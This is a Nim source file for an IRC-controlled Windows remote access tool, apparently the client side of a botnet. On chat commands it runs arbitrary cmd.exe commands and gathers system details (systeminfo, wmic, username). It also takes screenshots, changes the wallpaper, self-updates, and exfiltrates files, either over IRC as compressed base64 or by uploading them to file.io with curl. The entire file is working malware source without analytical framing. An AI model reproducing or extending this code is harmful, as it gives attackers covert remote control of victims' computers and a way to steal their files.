import irc, strutils, osproc, os, zippy, base64, math, update_handler, json, asyncdispatch, threadpool, encodings, screenshot, random, winim, bitops, alphanum

let
    g_dbg* = true
    g_msg_length = 400
    g_msg_send_time = 2 #seconds, this time is only valid when server starts throttling
    g_msg_max_transfer_time = 20
var
    g_abort = false
    g_send_sleep_time = 500 #used in helper_responseHandler



type
    ExecResponse = tuple
        exitCode:int
        output:string

# const
#     curl_exe = readFile("curl.exe")



proc helper_secondsToMinutesAndSeconds(seconds: int): Future[string] {.async.} =
    let minutes = seconds div 60
    let remainingSeconds = seconds mod 60
    return $minutes & "min " & $remainingSeconds & "sec"



## Recombine trailing tokens
## Required if the parameter is just one long string that included spaces
proc helper_recombine(tokens:seq[string], start = 1):Future[string] {.async.} =
    var first = true
    for i in start..<len(tokens):
        if first:
            result &= tokens[i]
            first = false
        else:
            result &= " " & tokens[i]



## Slice a long message into an array of strings that fit the message length limit
proc helper_chopString(victim:string):Future[seq[string]] {.async.} =
    var i:int
    while i < len(victim):
        if i+g_msg_length < len(victim):
            result.add(victim[i..i+g_msg_length])
        else:
            result.add(victim[i..high(victim)])
            break
        i+=g_msg_length+1



## Check to see if a message will take a long time to display be sent
## User will be informed of duration and what to do if it breaches the max transfer time
proc helper_checkSendDuration(event: IrcEvent, client:AsyncIrc, msg:string): Future[bool] {.async.} =
    var
        transfer_linecount:int = 0
        transfer_duration:int
        transfer_durStr:string
        transfer_lines:seq[string]

    for line in msg.splitLines():
        transfer_lines.add(line)
        transfer_linecount += int(math.floor(len(line) / g_msg_length)) + 1
    
    transfer_duration = transfer_linecount * g_msg_send_time
    transfer_durStr = await helper_secondsToMinutesAndSeconds(transfer_duration)


    discard client.privmsg(event.origin, "DATA incoming, no. of messages: " & $transfer_linecount & ", ~duration: " & transfer_durStr)

    if (transfer_duration > g_msg_max_transfer_time):
        discard client.privmsg(event.origin, "WARNING: the transfer will take more than " & $g_msg_max_transfer_time & "s. you need to force this command using '!' as the last token")
        return false
    else:
        return true





## Waits handles output from dispached functions. Required for async operations
## usually used to get async output from rexec
proc helper_responseHandler(response:Future[ExecResponse], client:AsyncIrc, event:IrcEvent) {.async.} =
    while not response.finished() and not response.failed():
        await sleepAsync(1000)
    
    if not response.failed():
        try:
            if response.read().exitCode == 0:
                var
                    value:string = response.read().output
                    value_filtered:string

                for line in value.splitLines():
                    if line.strip() != "":
                        value_filtered &= line & "\n"
                
                value_filtered = convert(value_filtered, "CP1252", "UTF-8")


                for line in value_filtered.splitLines():
                    if g_abort: break
                    echo "SENDING: ", line
                    await client.privmsg(event.origin, line)
                    ## Putting a sleep here just results in messages not arriving
                    ## instead of them arriving more quickly. So this has to stay commented for now
                    sleep(g_send_sleep_time)
                    
            else:
                discard client.privmsg(event.origin, "Error [ "  & $response.read().exitCode & " ]")
        except OSError as e:
            discard client.privmsg(event.origin, "failed to on a very deep level [" & repr(e) & "]")
    else:
        discard client.privmsg(event.origin, "cmd: future failed")



proc rexec_runCommand(cmd:string):Future[ExecResponse] {.async.} =
    var 
        output:string
        exitcode:int    
    (output, exitcode) = execCmdEx("cmd.exe /c " & cmd, options = {poUsePath})
    result.output = output
    result.exitCode = exitcode



## Because just using cd with execCmdEx doesnt do anything
proc rexec_changeDir(path:string):Future[bool] {.async.} =
    if os.dirExists(path):
        os.setCurrentDir(path)
        return true
    else:
        return false





## Uploads target file from target machine to file.io, sends link to controller
proc cmd_getFileIO(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} = 
    var filename = await helper_recombine(tokens,1)

    if fileExists(filename):
        try:
            var
                (output, _ ) = execCmdEx("cmd.exe /C curl -sF  \"file=@./" & filename & "\" \"https://file.io?expires=1h\"")
                trash:string
                i:int = 0

            while output[i] != '{':
                trash &= output[i]
                inc(i)

            output = output.replace(trash, "")

            if output.contains("success\":true"):
                try:
                    var json_data = parseJson(output)
                    var download_link = json_data["link"].str
                    client.privmsg(event.origin, "you have 1 attempt, 1 hour: " & download_link)
                except:
                    client.privmsg(event.origin, "parsing error, you have 1 hour: " & output)
            else:
                client.privmsg(event.origin, "failed: " & output)
        except:
            client.privmsg(event.origin, "you just crashed the whole thing with that")
    else:
        when defined(debug): echo "File missing"
        client.privmsg(event.origin, "i dont see it")





## Downloads the specified file, compresses it as .gz and sends it encoded as base64
## A very slow file transfer, maybe implement DCC somehow??
proc cmd_get(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
    var filename = await helper_recombine(tokens,1)

    if fileExists(filename):
        when defined(debug): echo "Opening file"
        var file = syncio.open(filename)
        var filestr = file.readAll()

        var cfile = compress(filestr)
        var b64_cfile = encode(cfile)
        
        if(not (await helper_checkSendDuration(event, client, b64_cfile)) and not force):
            return

        var i = 0

        while i < len(b64_cfile):
            if i+g_msg_length < len(b64_cfile):
                discard client.privmsg(event.origin, b64_cfile[i..i+g_msg_length])
            else:
                discard client.privmsg(event.origin, b64_cfile[i..high(b64_cfile)])
                break
            if g_abort: break
            await sleepAsync(g_msg_send_time*1000)
            i+=g_msg_length+1
        close(file)

        client.privmsg(event.origin, "DATA transfer complete")
    else:
        when defined(debug): echo "File missing"
        client.privmsg(event.origin, "that did not work out")






## Similar to cmd_get, but sends the file's contents as plain text
proc cmd_print(event:IrcEvent, client:AsyncIrc, tokens:seq[string], force:bool) {.async.} = 
    var filename = await helper_recombine(tokens,1)

    if fileExists(filename):
        var file = syncio.open(filename)
        var filestr = file.readAll()
            
        if(not (await helper_checkSendDuration(event, client, fileStr)) and not force):
            return

        for line in filestr.splitLines():
            if strip(line) == "": continue
            if len(line) > g_msg_length:
                var line_copped = await helper_chopString(line)
                for morsel in line_copped:
                    discard client.privmsg(event.origin, morsel)
            else:
                discard client.privmsg(event.origin, line)
            if g_abort: break
            await sleepAsync(g_msg_send_time*1000)

        close(file)

        client.privmsg(event.origin, "DATA transfer complete")
    else:
        when defined(debug): echo "File missing"
        client.privmsg(event.origin, "that did not work out")






## Runs dxdiag and sends the output text file using cmd_get
proc cmd_dxdiag(event:IrcEvent, client:AsyncIrc) {.async.} =
    discard client.privmsg(event.origin,"one moment")
    when defined(debug): echo "Starting dxdiag"
    var 
        cmd:string = "cmd.exe /c dxdiag /dontskip /t dxdiag_file.txt"
        outputx:string
        exitcodex:int
    (outputx,exitcodex) = execCmdEx(cmd, options = {poUsePath})

    when defined(debug): echo "Checking file"
    await cmd_get(event, client, @["dxdiag_file.txt"], true)
    removeFile("dxdiag_file.txt")

    when defined(debug): echo "Dxdiag command done"





## Processes !rexec
## Contains some shortcuts for certain functions, everything else just gets sent to rexec_runCommand
proc cmd_rexec(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
    if len(tokens) < 2:
        discard client.privmsg(event.origin, "too short")
        return

    case tokens[1]:
    of "cd":
        if len(tokens) == 2:
            #response = await rexec_runCommand("echo %CD%")
            discard helper_responseHandler(rexec_runCommand("echo %CD%"), client, event)
            #caught = true
        else:
            var path = await helper_recombine(tokens,2)
            if await rexec_changeDir(path):
                discard client.privmsg(event.origin, "cwd: " & path)
            else:
                discard client.privmsg(event.origin, "cwd: no such directory")

    of "cd..":
        #response = await rexec_runCommand("cd ..")
        discard helper_responseHandler(rexec_runCommand("cd .."), client, event)
        #caught = true
    of "ls":
        #response = await rexec_runCommand("dir /w")
        discard helper_responseHandler(rexec_runCommand("dir /w"), client, event)
        #caught = true
    else:
        var args:string
        args = await helper_recombine(tokens)
        
        when defined(debug): echo "ARGS: " & args

        discard helper_responseHandler(rexec_runCommand(args), client, event)





proc cmd_abort():void {.thread.} = 
    g_abort = true
    sleep(2500)
    g_abort = false





## Playing around with the sleep time used in cmd_responseHandler
## note sure which is ideal so this function is used for rapid testing
proc cmd_setSendSleep(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
    try:
        g_send_sleep_time = parseInt(tokens[1])
        discard client.privmsg(event.origin, "sleep send time set to " & $g_send_sleep_time & "ms")
    except:
        discard client.privmsg(event.origin, "parsing failed, or something")




proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
    randomize()
    var
        current_dir = getCurrentDir()
        rand_dir_dame = rand(100000..999999)
        rand_filename = rand(100000..999999)
        scrndir = getTempDir() & $rand_dir_dame
    try:
        if not dirExists(scrndir):
            discard client.privmsg(event.origin,"dir missing, creating dir")
            createDir(scrndir)

        setCurrentDir(scrndir)
        discard client.privmsg(event.origin,"taking screenshot")
        srcn_screenshot($rand_filename & ".bmp")
        

        if not fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
            discard client.privmsg(event.origin, "failed to create screenshot")
            if dirExists(scrndir):
                removeDir(scrndir)
            return
        else:
            await client.privmsg(event.origin,"screenshot was created and was found. trying to upload")
            var
                bitmap_contents = readFile($rand_filename & ".bmp")
                bitmap_compress = compress(bitmap_contents)
            writeFile($rand_filename & ".gz", bitmap_compress)
            sleep(1000)
            var faketokens:seq[string] = @["", $rand_filename & ".gz"]
            await cmd_getFileIO(event, client, faketokens)
            await client.privmsg(event.origin,"starting cleanup")
            return
    except OSError as e:
        discard client.privmsg(event.origin, "there was trouble while taking the screenshot [" & repr(e) & "]")
    finally:
        try:
            if fileExists(scrndir & "\\" & $rand_filename & ".bmp"):
                removeFile(scrndir & "\\" & $rand_filename & ".bmp")
        except OSError as e:
            discard client.privmsg(event.origin, "problem removing " & $rand_filename & ".bmp" & "  [" & repr(e) & "]")

        try:  
            if fileExists(scrndir & "\\" & $rand_filename & ".gz"):
                removeFile(scrndir & "\\" & $rand_filename & ".gz")
        except OSError as e:
            discard client.privmsg(event.origin, "problem removing " & $rand_filename & ".gz" & "  [" & repr(e) & "]")

        try:
            setCurrentDir(current_dir) 
            if dirExists(scrndir):
                removeDir(scrndir)
            await client.privmsg(event.origin,"cleanup successful")
        except OSError as e: 
            discard client.privmsg(event.origin, "problem removing " & scrndir & "  [" & repr(e) & "]")
            discard rexec_runCommand("rmdir /s /q " & scrndir)
        setCurrentDir(current_dir)  





proc cmd_wallpaper(event:IrcEvent, client:AsyncIrc,tokens:seq[string]) {.async.} =
    try:
        discard client.privmsg(event.origin, "trying to change wallpaper")
        var url = await helper_recombine(tokens)
        randomize()
        var
            randint = rand(1000000..9999999)
            imagedata = updt_fetchWebsiteContent(url)
            filename = $randint
            fullpath:cstring = (getTempDir() & $randint & "\\" & filename).cstring
            current_dir = getCurrentDir()
        if not dirExists(getTempDir() & $randint):
            createDir(getTempDir() & $randint)
        setCurrentDir(getTempDir() & $randint)
        writeFile(filename, imagedata)
        discard SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, fullpath, bitor(SPIF_UPDATEINIFILE,SPIF_SENDCHANGE))
        setCurrentDir(current_dir)
        removeFile(getTempDir() & $randint & "\\" & filename)
        discard client.privmsg(event.origin, "no errors")
    except OSError as e:
         discard client.privmsg(event.origin, "error changing wallpaper [" & repr(e) & "]")





# proc cmd_setupCurl(event:IrcEvent, client:AsyncIrc) {.async.}=
#     try:
#         var
#             curl_tmp_dir = getTempDir() & alphaNumeric(8) & "\\"
#             curl_exe_path = curl_tmp_dir & "curl.exe"
#         writeFile(curl_exe_path,curl_exe)
#         discard client.privmsg(event.origin, "well i tried. path: " & curl_exe_path)
#     except OSError as e:
#         discard client.privmsg(event.origin, "that did not work: " & repr(e))



# proc cmd_setCurlPath(event:IrcEvent, client:AsyncIrc, tokens:seq[string]) {.async.} =
#     discard



## Checks if a private message was a command and calls appropriate functions
proc cmdh_handle*(event:IrcEvent, client:AsyncIrc):void {.thread.} =
    var
        msg = event.params[event.params.high]
        tokens:seq[string]

    when defined(debug): echo "MSG: ", msg

    for token in msg.tokenize():
        if not token.isSep:
            tokens.add(token.token)

    case tokens[0]:
    of "!hey":
        var
            win_ver = "<void>"
            win_csd = "<void>"
            win_sys = "<void>"
            win_mod = "<void>"
        
        try:
            var (output, _ ) = execCmdEx("cmd.exe /c ver" ,options = {poUsePath})
            output = output.strip(chars={'\r','\n'})
            win_ver = output
        except OSError as e:
            #win_ver = repr(e)
            discard

        try:
            var (output, _ ) = execCmdEx("cmd.exe /c wmic os get Caption,CSDVersion /value" ,options = {poUsePath})
            output = output.strip(chars={'\r','\n'})
            output.stripLineEnd()
            win_csd = output
        except OSError as e:
            #win_csd = repr(e)
            discard

        try:
            var (output, _ ) = execCmdEx("cmd.exe /c systeminfo" ,options = {poUsePath})
            output = output.strip(chars={'\r','\n'})
            output.stripLineEnd()
            win_sys = output
        except OSError as e:
            #win_sys = repr(e)
            discard
        try:
            var (output, _ ) = execCmdEx("cmd.exe /c wmic computersystem get Model /value" ,options = {poUsePath})
            output = output.strip(chars={'\r','\n'})
            output.stripLineEnd()
            win_mod = output
        except OSError as e:
            #win_mod = repr(e)
            discard
        
        var finalmsg:string =  "heyyy v" & 
                        $current_version & " as " & getEnv("USERNAME") &
                        " VER: [" & win_ver & "]" &
                        " CSD: [" & win_csd & "]" &
                        " SYS: [" & win_sys & "]" &
                        " MOD: [" & win_mod & "]" 
        finalmsg = finalmsg.strip(chars={'\r','\n'})
        finalmsg.stripLineEnd()

        discard client.privmsg(event.origin, finalmsg)

    of "!lag": discard client.privmsg(event.origin, formatFloat(client.getLag))
    of "!excessFlood":
        for i in 0..10:
            discard client.privmsg(event.origin, "TEST" & $i)
    of "!dxdiag":
        discard cmd_dxdiag(event, client)
    of "!r": #remote execution
        discard cmd_rexec(event, client, tokens)
    of "!getfio":
        discard cmd_getFileIO(event, client, tokens)
    of "!get":
        if tokens[high(tokens)] == "!":
            var ftokens = tokens
            ftokens.delete(high(tokens))
            discard cmd_get(event, client, ftokens, true)
        else:
            discard cmd_get(event, client, tokens, false)
    of "!print":
        if tokens[high(tokens)] == "!":
            var ftokens = tokens
            ftokens.delete(high(tokens))
            discard cmd_print(event, client, ftokens, true)
        else:
            discard cmd_print(event, client, tokens, false)
    of "!update":
        discard updt_check(true , client, event, false)
    of "!forceupdate":
        discard updt_check(true , client, event, true)
    of "!abort":
        spawn cmd_abort()
    of "!sendsleep":
        discard cmd_setSendSleep(event, client, tokens)
    of "!screenshot":
        discard cmd_screenshot(event, client)
    of "!wallpaper":
        discard cmd_wallpaper(event, client, tokens)
    of "!cmds":
        discard client.privmsg(event.origin, "hey, lag, excessFlood, dxdiag, r <cmd>, getfio <file>, get <file>, print <file<, update, forceupdate, sendsleep <integer>, screenshot, wallpaper <url>, cmds")
    

        